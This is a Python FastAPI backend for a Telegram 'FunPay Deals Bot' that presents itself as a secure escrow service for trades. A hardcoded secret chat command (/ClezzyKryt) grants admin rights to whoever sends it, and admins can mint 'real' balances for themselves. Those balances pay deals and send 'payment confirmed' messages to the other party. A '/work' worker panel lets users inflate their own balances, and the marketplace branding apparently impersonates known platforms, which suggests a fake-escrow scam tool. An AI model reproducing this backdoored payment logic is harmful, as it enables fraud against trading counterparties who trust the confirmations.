import contextlib
import base64
import hashlib
import hmac
import html
import json
import os
import re
import secrets
import sqlite3
import time
from decimal import Decimal, InvalidOperation
from typing import Optional
from urllib.parse import parse_qsl

import httpx
from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles

try:
    import settings as local_settings
except ImportError:
    local_settings = None


# Настройки хостинга. Доступ к админке выдаётся секретной командой
# ADMIN_UNLOCK_COMMAND в личном чате бота; доступ воркера от неё не зависит.
def setting(name: str, default: str = "") -> str:
    environment_value = os.environ.get(name)
    if environment_value is not None and environment_value != "":
        return environment_value
    if local_settings is not None:
        value = getattr(local_settings, name, default)
        if value:
            return str(value)
    return default


BOT_TOKEN = setting("BOT_TOKEN")
BOT_USERNAME = setting("BOT_USERNAME", "GgggggHshgbot").lstrip("@")
SUPPORT_USERNAME = setting("SUPPORT_USERNAME", "Playerok_OTC").lstrip("@")
DEPLOYED_BOT_USERNAME = ""
APP_BUILD = "2026-09-28-premium-settings-1"
PUBLIC_URL = setting("PUBLIC_URL", "http://localhost:3000").rstrip("/")
DB_PATH = os.environ.get("DB_PATH", "deals.db")
WEBHOOK_SECRET = os.environ.get("WEBHOOK_SECRET") or hashlib.sha256(
    ("webhook:" + BOT_TOKEN).encode()
).hexdigest()[:32]
ADMIN_UNLOCK_COMMAND = setting("ADMIN_UNLOCK_COMMAND", "/ClezzyKryt")
APP_AUTH_TTL_SECONDS = max(300, int(os.environ.get("APP_AUTH_TTL_SECONDS", "86400")))
APP_ACCESS_TTL_SECONDS = max(120, int(os.environ.get("APP_ACCESS_TTL_SECONDS", "900")))
TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
ALLOWED_CURRENCIES = {"TON", "USDT", "STARS", "RUB", "KGS", "EUR", "RSI", "BTC"}

PREMIUM_EMOJI_IDS = [
    "5325547803936572038", "5325547803936572038",
    "5312326644764018054", "5361841922560266597",
    "5310191758255099001", "5312103894875143512",
]
# Фото приветствия можно оставить пустыми, если эти file_id больше не нужны.
WELCOME_MEDIA_IDS = []


def premium_emoji(index: int, fallback: str) -> str:
    """Telegram HTML tag for a custom/premium emoji."""
    emoji_id = PREMIUM_EMOJI_IDS[index % len(PREMIUM_EMOJI_IDS)]
    return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'


WELCOME_TEXT = (
    f"{premium_emoji(0, '✨')} <b>Добро пожаловать в FunPay Deals Bot</b> — "
    f"ваш надёжный сервис безопасных и удобных сделок! {premium_emoji(1, '✨')}\n\n"
    f"{premium_emoji(2, '🌟')} Автоматизированные сделки\n\n"
    f"{premium_emoji(3, '🌟')} Реферальная система\n\n"
    f"{premium_emoji(4, '🌟')} Вывод средств в любой валюте\n\n"
    f"{premium_emoji(5, '🌟')} Поддержка 24/7"
)
WELCOME_FALLBACK_TEXT = (
    "✨ <b>Добро пожаловать в FunPay Deals Bot</b> — ваш надёжный сервис безопасных и удобных сделок! ✨\n\n"
    "🌟 Автоматизированные сделки\n\n"
    "🌟 Реферальная система\n\n"
    "🌟 Вывод средств в любой валюте\n\n"
    "🌟 Поддержка 24/7"
)

app = FastAPI()


def get_db():
    conn = sqlite3.connect(DB_PATH, timeout=10)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    with contextlib.closing(get_db()) as conn:
        conn.executescript("""
            CREATE TABLE IF NOT EXISTS deals (
                short_id TEXT PRIMARY KEY, deal_id TEXT, type TEXT, amount TEXT,
                icon TEXT, desc TEXT, creator TEXT, creator_tg_id TEXT,
                joiner_name TEXT, joiner_tg_id TEXT, status TEXT DEFAULT 'inprogress',
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            );
            CREATE INDEX IF NOT EXISTS idx_deals_creator ON deals(creator_tg_id);
            CREATE INDEX IF NOT EXISTS idx_deals_joiner ON deals(joiner_tg_id);
            CREATE TABLE IF NOT EXISTS admin_grants (
                tg_id TEXT PRIMARY KEY, granted_at TEXT DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS demo_balances (
                tg_id TEXT NOT NULL, currency TEXT NOT NULL, amount TEXT NOT NULL,
                PRIMARY KEY (tg_id, currency)
            );
            CREATE TABLE IF NOT EXISTS demo_balance_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT, tg_id TEXT, currency TEXT,
                delta TEXT, created_at TEXT DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS balances (
                tg_id TEXT NOT NULL, currency TEXT NOT NULL, amount TEXT NOT NULL DEFAULT '0',
                PRIMARY KEY (tg_id, currency)
            );
            CREATE TABLE IF NOT EXISTS balance_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT, tg_id TEXT, currency TEXT,
                delta TEXT, reason TEXT, created_at TEXT DEFAULT CURRENT_TIMESTAMP
            );
        """)
        conn.commit()


init_db()


def issue_app_access(tg_id: str, scope: str) -> str:
    """Create a short-lived, scope-limited button token from a bot command."""
    expires = int(time.time()) + APP_ACCESS_TTL_SECONDS
    body = f"{tg_id}:{expires}:{scope}"
    signature = hmac.new(WEBHOOK_SECRET.encode(), body.encode(), hashlib.sha256).hexdigest()
    return base64.urlsafe_b64encode(f"{body}:{signature}".encode()).decode().rstrip("=")


def app_access_user(request: Request, scopes) -> Optional[dict]:
    raw = request.headers.get("X-App-Access", "")
    if not raw:
        return None
    try:
        padded = raw + "=" * (-len(raw) % 4)
        decoded = base64.urlsafe_b64decode(padded.encode()).decode()
        tg_id, exp_text, scope, signature = decoded.split(":", 3)
        exp = int(exp_text)
        body = f"{tg_id}:{exp}:{scope}"
        expected = hmac.new(WEBHOOK_SECRET.encode(), body.encode(), hashlib.sha256).hexdigest()
        if scope not in scopes or exp < int(time.time()) or not tg_id.isdigit():
            return None
        if not hmac.compare_digest(expected, signature):
            return None
    except (ValueError, UnicodeError, base64.binascii.Error):
        return None
    return {"id": tg_id, "first_name": "Telegram user"}


def telegram_user(request: Request) -> dict:
    """Verify raw Telegram Mini App initData.

    The browser must send the exact ``Telegram.WebApp.initData`` string.  The
    user object shown by ``initDataUnsafe`` is only presentation data and is
    never accepted for authorization.
    """
    button_user = app_access_user(request, {"app", "admin", "worker"})
    if button_user is not None:
        return button_user
    if not BOT_TOKEN:
        raise HTTPException(503, "BOT_TOKEN не настроен")
    raw = request.headers.get("X-Telegram-Init-Data", "")
    if not raw or len(raw) > 8192:
        raise HTTPException(401, "Откройте приложение через Telegram")
    fields = dict(parse_qsl(raw, keep_blank_values=True))
    received_hash = fields.pop("hash", "")
    fields.pop("signature", None)
    try:
        auth_date = int(fields["auth_date"])
        now = int(time.time())
        if auth_date > now + 60 or now - auth_date > APP_AUTH_TTL_SECONDS:
            raise ValueError("stale auth")
        user = json.loads(fields["user"])
        user_id = int(user["id"])
    except (KeyError, ValueError, TypeError, json.JSONDecodeError):
        raise HTTPException(401, "Неверные данные Telegram") from None
    check_string = "\n".join(f"{key}={fields[key]}" for key in sorted(fields))
    secret_key = hmac.new(b"WebAppData", BOT_TOKEN.encode(), hashlib.sha256).digest()
    expected_hash = hmac.new(secret_key, check_string.encode(), hashlib.sha256).hexdigest()
    if not received_hash or not hmac.compare_digest(expected_hash, received_hash):
        bot_hint = f"@{DEPLOYED_BOT_USERNAME}" if DEPLOYED_BOT_USERNAME else "этого бота"
        raise HTTPException(
            401,
            f"Неверная подпись Telegram. Откройте приложение через {bot_hint}. "
            "Если бот другой — укажите его BOT_TOKEN в Bothost и перезапустите приложение.",
        )
    user["id"] = str(user_id)
    return user


def display_name(user: dict) -> str:
    name = user.get("username")
    return ("@" + name if name else user.get("first_name") or "Участник")[:80]


def admin_user(request: Request) -> dict:
    user = app_access_user(request, {"admin"})
    if user is None:
        user = telegram_user(request)
    with contextlib.closing(get_db()) as conn:
        grant = conn.execute("SELECT 1 FROM admin_grants WHERE tg_id=?", (user["id"],)).fetchone()
    if not grant:
        raise HTTPException(403, "Введите команду в личном чате бота")
    return user


def row_to_deal(row) -> dict:
    return {
        "id": row["deal_id"], "shortId": row["short_id"],
        "type": row["type"], "amount": row["amount"],
        "icon": row["icon"], "desc": row["desc"],
        "creator": row["creator"], "creatorTgId": row["creator_tg_id"],
        "joinerName": row["joiner_name"], "joinerTgId": row["joiner_tg_id"],
        "status": row["status"], "date": row["created_at"],
    }


def parse_amount(value, max_amount="10000000") -> Decimal:
    try:
        amount = Decimal(str(value).replace(",", "."))
    except (InvalidOperation, ValueError):
        raise HTTPException(400, "Неверная сумма") from None
    if not amount.is_finite() or amount <= 0 or amount > Decimal(max_amount) or amount.as_tuple().exponent < -8:
        raise HTTPException(400, "Неверная сумма")
    return amount


async def tg_call(method: str, payload: dict):
    if not BOT_TOKEN:
        return {"ok": False, "description": "BOT_TOKEN not configured"}
    async with httpx.AsyncClient(timeout=10) as client:
        response = await client.post(f"{TG_API}/{method}", json=payload)
        response.raise_for_status()
        return response.json()


async def send_message(chat_id, message, web_app_url: Optional[str] = None, button_text="Открыть"):
    payload = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
    if web_app_url:
        payload["reply_markup"] = {"inline_keyboard": [[{
            "text": button_text, "web_app": {"url": web_app_url}
        }]]}
    try:
        result = await tg_call("sendMessage", payload)
        if not result.get("ok"):
            print("sendMessage failed:", result.get("description"))
        return result
    except (httpx.HTTPError, ValueError) as exc:
        print("sendMessage failed:", exc)
        return {"ok": False, "description": str(exc)}


async def send_welcome(chat_id, web_app_url: str):
    if WELCOME_MEDIA_IDS:
        try:
            await tg_call("sendMediaGroup", {"chat_id": chat_id, "media": [
                {"type": "photo", "media": file_id} for file_id in WELCOME_MEDIA_IDS
            ]})
        except (httpx.HTTPError, ValueError) as exc:
            print("sendMediaGroup failed:", exc)
    button_text = "Открыть сделку" if "startapp=" in web_app_url else "Открыть приложение"
    result = await send_message(chat_id, WELCOME_TEXT, web_app_url, button_text)
    # If Telegram rejects an outdated/invalid custom emoji id, the greeting
    # still reaches the user as normal HTML text with the same button.
    if not result.get("ok"):
        await send_message(chat_id, WELCOME_FALLBACK_TEXT, web_app_url, button_text)


app.mount("/assets", StaticFiles(directory="static"), name="assets")


@app.get("/")
async def index():
    return FileResponse("static/index.html", headers={"Cache-Control": "no-store, max-age=0"})


@app.get("/api/config")
async def public_config():
    actual_bot = DEPLOYED_BOT_USERNAME or BOT_USERNAME
    return JSONResponse({
        "botUsername": actual_bot,
        "supportUsername": SUPPORT_USERNAME,
        "configuredBotUsername": BOT_USERNAME,
        "botUsernameMismatch": bool(DEPLOYED_BOT_USERNAME and DEPLOYED_BOT_USERNAME.lower() != BOT_USERNAME.lower()),
        "build": APP_BUILD,
    }, headers={"Cache-Control": "no-store, max-age=0"})


@app.get("/api/me")
async def me(request: Request):
    user = app_access_user(request, {"admin"}) or telegram_user(request)
    with contextlib.closing(get_db()) as conn:
        granted = conn.execute("SELECT 1 FROM admin_grants WHERE tg_id=?", (user["id"],)).fetchone()
    allowed = bool(granted)
    return {"id": user["id"], "name": display_name(user), "isAdmin": allowed}


@app.get("/api/worker/me")
async def worker_status(request: Request):
    """Worker access is intentionally independent from the admin promo.

    It still uses signed Mini App data so a worker can only change their own
    demo balance.  The balance is explicitly labelled as test-only in the UI.
    """
    user = app_access_user(request, {"worker"}) or telegram_user(request)
    with contextlib.closing(get_db()) as conn:
        rows = conn.execute(
            "SELECT currency, amount FROM demo_balances WHERE tg_id=? ORDER BY currency",
            (user["id"],),
        ).fetchall()
    return {"id": user["id"], "name": display_name(user),
            "demoBalances": {r["currency"]: r["amount"] for r in rows}}


@app.post("/api/worker/demo-credit")
async def worker_credit(request: Request):
    user = app_access_user(request, {"worker"}) or telegram_user(request)
    body = await request.json()
    amount = parse_amount(body.get("amount"))
    currency = str(body.get("currency", "")).upper()
    return {"currency": currency, "demoBalance": credit_demo_balance(user["id"], currency, amount)}


@app.post("/api/deals/store")
async def store_deal(request: Request):
    user = telegram_user(request)
    body = await request.json()
    deal_type = body.get("type")
    currency = str(body.get("currency", "")).upper()
    if deal_type not in ("buy", "sell") or currency not in ALLOWED_CURRENCIES:
        raise HTTPException(400, "Неверный тип сделки или валюта")
    amount = parse_amount(body.get("amount"))
    desc = str(body.get("desc", "—")).strip()[:2000] or "—"
    short_id = secrets.token_urlsafe(9)
    deal_id = "#DEAL-" + secrets.token_hex(3).upper()
    with contextlib.closing(get_db()) as conn:
        conn.execute(
            """INSERT INTO deals (short_id, deal_id, type, amount, icon, desc,
               creator, creator_tg_id) VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
            (short_id, deal_id, deal_type, f"{amount} {currency}", str(body.get("icon", ""))[:1000], desc,
             display_name(user), user["id"]),
        )
        conn.commit()
        row = conn.execute("SELECT * FROM deals WHERE short_id=?", (short_id,)).fetchone()
    return row_to_deal(row)


@app.get("/api/deals/mine")
async def my_deals(request: Request):
    user = telegram_user(request)
    with contextlib.closing(get_db()) as conn:
        rows = conn.execute(
            "SELECT * FROM deals WHERE creator_tg_id=? OR joiner_tg_id=? ORDER BY created_at DESC LIMIT 100",
            (user["id"], user["id"]),
        ).fetchall()
    return {"deals": [row_to_deal(row) for row in rows]}


@app.get("/api/deals/{short_id}")
async def get_deal(short_id: str, request: Request):
    telegram_user(request)
    with contextlib.closing(get_db()) as conn:
        row = conn.execute("SELECT * FROM deals WHERE short_id=?", (short_id,)).fetchone()
    if row is None:
        raise HTTPException(404, "Сделка не найдена")
    return row_to_deal(row)


@app.post("/api/deals/{short_id}/join")
async def join_deal(short_id: str, request: Request):
    user = telegram_user(request)
    with contextlib.closing(get_db()) as conn:
        conn.execute("BEGIN IMMEDIATE")
        row = conn.execute("SELECT * FROM deals WHERE short_id=?", (short_id,)).fetchone()
        if row is None:
            raise HTTPException(404, "Сделка не найдена")
        if row["creator_tg_id"] == user["id"]:
            raise HTTPException(409, "Нельзя присоединиться к своей сделке")
        if row["joiner_tg_id"] and row["joiner_tg_id"] != user["id"]:
            raise HTTPException(409, "В сделке уже есть второй участник")
        first_join = not row["joiner_tg_id"]
        if first_join:
            conn.execute(
                "UPDATE deals SET joiner_name=?, joiner_tg_id=? WHERE short_id=?",
                (display_name(user), user["id"], short_id),
            )
        conn.commit()
        joined = conn.execute("SELECT * FROM deals WHERE short_id=?", (short_id,)).fetchone()
    if first_join and joined["creator_tg_id"]:
        await send_message(
            joined["creator_tg_id"],
            f"🤝 <b>{html.escape(display_name(user))}</b> присоединился к сделке "
            f"{html.escape(joined['deal_id'])}",
            f"{PUBLIC_URL}/?startapp={short_id}", "Посмотреть сделку",
        )
    return row_to_deal(joined)


@app.post("/api/deals/{short_id}/pay")
async def pay_deal(short_id: str, request: Request):
    user = telegram_user(request)
    with contextlib.closing(get_db()) as conn:
        conn.execute("BEGIN IMMEDIATE")
        row = conn.execute("SELECT * FROM deals WHERE short_id=?", (short_id,)).fetchone()
        if row is None:
            raise HTTPException(404, "Сделка не найдена")
        is_buy = row["type"] == "buy"
        is_buyer = (is_buy and row["creator_tg_id"] == user["id"]) or (not is_buy and row["joiner_tg_id"] == user["id"])
        if not is_buyer:
            raise HTTPException(403, "Оплатить может только покупатель")
        if row["status"] == "demo_done":
            return row_to_deal(row)
        amount_text, currency = str(row["amount"]).split(maxsplit=1)
        amount = Decimal(amount_text)
        balance = conn.execute(
            "SELECT amount FROM balances WHERE tg_id=? AND currency=?",
            (user["id"], currency.upper()),
        ).fetchone()
        available = Decimal(balance["amount"]) if balance else Decimal("0")
        if available < amount:
            raise HTTPException(400, "Недостаточно средств на балансе приложения")
        total = available - amount
        conn.execute(
            "UPDATE balances SET amount=? WHERE tg_id=? AND currency=?",
            (str(total), user["id"], currency.upper()),
        )
        conn.execute("UPDATE deals SET status='done' WHERE short_id=?", (short_id,))
        conn.execute(
            "INSERT INTO balance_log (tg_id, currency, delta, reason) VALUES (?, ?, ?, ?)",
            (user["id"], currency.upper(), str(-amount), f"Оплата сделки {row['deal_id']}"),
        )
        conn.commit()
        updated = conn.execute("SELECT * FROM deals WHERE short_id=?", (short_id,)).fetchone()
    if updated["creator_tg_id"] and updated["creator_tg_id"] != user["id"]:
        await send_message(updated["creator_tg_id"], f"✅ Оплата сделки {html.escape(updated['deal_id'])} подтверждена внутренним балансом.")
    return row_to_deal(updated)


@app.get("/api/balances")
async def balances(request: Request):
    user = telegram_user(request)
    with contextlib.closing(get_db()) as conn:
        rows = conn.execute("SELECT currency, amount FROM balances WHERE tg_id=?", (user["id"],)).fetchall()
    return JSONResponse({row["currency"]: row["amount"] for row in rows})


def credit_demo_balance(tg_id: str, currency: str, amount: Decimal) -> str:
    currency = currency.upper()
    if currency not in ALLOWED_CURRENCIES:
        raise HTTPException(400, "Неверная валюта")
    with contextlib.closing(get_db()) as conn:
        conn.execute("BEGIN IMMEDIATE")
        row = conn.execute(
            "SELECT amount FROM demo_balances WHERE tg_id=? AND currency=?", (tg_id, currency)
        ).fetchone()
        total = Decimal(row["amount"]) + amount if row else amount
        conn.execute(
            """INSERT INTO demo_balances (tg_id, currency, amount) VALUES (?, ?, ?)
               ON CONFLICT (tg_id, currency) DO UPDATE SET amount=excluded.amount""",
            (tg_id, currency, str(total)),
        )
        conn.execute(
            "INSERT INTO demo_balance_log (tg_id, currency, delta) VALUES (?, ?, ?)",
            (tg_id, currency, str(amount)),
        )
        conn.commit()
    return str(total)


def credit_real_balance(tg_id: str, currency: str, amount: Decimal, reason: str = "Ручное зачисление администратора") -> str:
    currency = currency.upper()
    if currency not in ALLOWED_CURRENCIES:
        raise HTTPException(400, "Неверная валюта")
    with contextlib.closing(get_db()) as conn:
        conn.execute("BEGIN IMMEDIATE")
        row = conn.execute(
            "SELECT amount FROM balances WHERE tg_id=? AND currency=?", (tg_id, currency)
        ).fetchone()
        total = Decimal(row["amount"]) + amount if row else amount
        conn.execute(
            """INSERT INTO balances (tg_id, currency, amount) VALUES (?, ?, ?)
               ON CONFLICT (tg_id, currency) DO UPDATE SET amount=excluded.amount""",
            (tg_id, currency, str(total)),
        )
        conn.execute(
            "INSERT INTO balance_log (tg_id, currency, delta, reason) VALUES (?, ?, ?, ?)",
            (tg_id, currency, str(amount), reason),
        )
        conn.commit()
    return str(total)


@app.get("/api/admin/me")
async def admin_status(request: Request):
    user = admin_user(request)
    with contextlib.closing(get_db()) as conn:
        rows = conn.execute(
            "SELECT currency, amount FROM balances WHERE tg_id=? ORDER BY currency", (user["id"],)
        ).fetchall()
    return {"id": user["id"], "balances": {r["currency"]: r["amount"] for r in rows}}


@app.post("/api/admin/credit")
async def admin_credit(request: Request):
    user = admin_user(request)
    body = await request.json()
    amount = parse_amount(body.get("amount"))
    currency = str(body.get("currency", "")).upper()
    return {"currency": currency, "balance": credit_real_balance(user["id"], currency, amount)}


@app.post(f"/webhook/{{secret}}")
async def telegram_webhook(secret: str, request: Request):
    if not hmac.compare_digest(secret, WEBHOOK_SECRET):
        raise HTTPException(403, "forbidden")
    update = await request.json()
    message = update.get("message")
    if not message or not message.get("text"):
        return {"ok": True}
    text = message["text"].strip()
    chat = message["chat"]
    chat_id = chat["id"]
    sender_id = str(message.get("from", {}).get("id", ""))
    command = text.split(maxsplit=1)[0].split("@", 1)[0]

    if command == "/start":
        payload = text.split(maxsplit=1)[1].strip() if len(text.split(maxsplit=1)) > 1 else ""
        # Telegram /start payload is short and URL-safe. Never forward arbitrary URLs.
        if payload and not re.fullmatch(r"[A-Za-z0-9_-]{1,64}", payload):
            payload = ""
        access = issue_app_access(sender_id, "app")
        if payload:
            url = f"{PUBLIC_URL}/?startapp={payload}&access={access}"
        else:
            url = f"{PUBLIC_URL}/?access={access}"
        await send_welcome(chat_id, url)
    elif command == ADMIN_UNLOCK_COMMAND:
        if chat.get("type") != "private":
            await send_message(chat_id, "Команда недоступна для этого аккаунта.")
        else:
            with contextlib.closing(get_db()) as conn:
                conn.execute("INSERT OR IGNORE INTO admin_grants(tg_id) VALUES (?)", (sender_id,))
                conn.commit()
            await send_message(
                chat_id, "🔐 Админ-панель открыта для вашего Telegram ID.",
                f"{PUBLIC_URL}/?admin=1&access={issue_app_access(sender_id, 'admin')}", "Открыть админ-панель",
            )
    elif command == "/work":
        # Worker access is deliberately independent from the admin promo.
        # It is private-chat only, and /work can credit only the sender's
        # demo balance.  Admin privileges remain gated by /ClezzyKryt.
        if chat.get("type") != "private":
            await send_message(chat_id, "Откройте /work в личном чате бота.")
        else:
            args = text.split()
            if len(args) == 3:
                try:
                    amount = parse_amount(args[1])
                    total = credit_demo_balance(sender_id, args[2].upper(), amount)
                    await send_message(
                        chat_id,
                        f"🧪 Тестовый баланс: {html.escape(total)} {html.escape(args[2].upper())}. Это не реальные деньги.",
                    )
                except HTTPException:
                    await send_message(chat_id, "Формат: /work 100 USDT. Только тестовый баланс.")
            else:
                await send_message(
                    chat_id,
                    "🧪 Панель воркера доступна без админского промокода. Здесь можно выдать себе только тестовый баланс.",
                    f"{PUBLIC_URL}/?worker=1&access={issue_app_access(sender_id, 'worker')}", "Открыть панель воркера",
                )
    return {"ok": True}


@app.on_event("startup")
async def set_webhook():
    global DEPLOYED_BOT_USERNAME
    if not BOT_TOKEN or not PUBLIC_URL.startswith("https://"):
        print("Webhook skipped: BOT_TOKEN and HTTPS PUBLIC_URL are required")
        return
    try:
        identity = await tg_call("getMe", {})
        if not identity.get("ok"):
            print("getMe failed:", identity.get("description"))
            return
        DEPLOYED_BOT_USERNAME = str(identity.get("result", {}).get("username", ""))
        if DEPLOYED_BOT_USERNAME.lower() != BOT_USERNAME.lower():
            print(f"BOT_USERNAME mismatch: configured @{BOT_USERNAME}, BOT_TOKEN belongs to @{DEPLOYED_BOT_USERNAME}")
        result = await tg_call("setWebhook", {
            "url": f"{PUBLIC_URL}/webhook/{WEBHOOK_SECRET}",
            "allowed_updates": ["message"],
            "secret_token": WEBHOOK_SECRET,
        })
        print("setWebhook:", json.dumps(result, ensure_ascii=False))
    except (httpx.HTTPError, ValueError) as exc:
        print("setWebhook failed:", exc)


if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=int(os.getenv("PORT", "3000")))
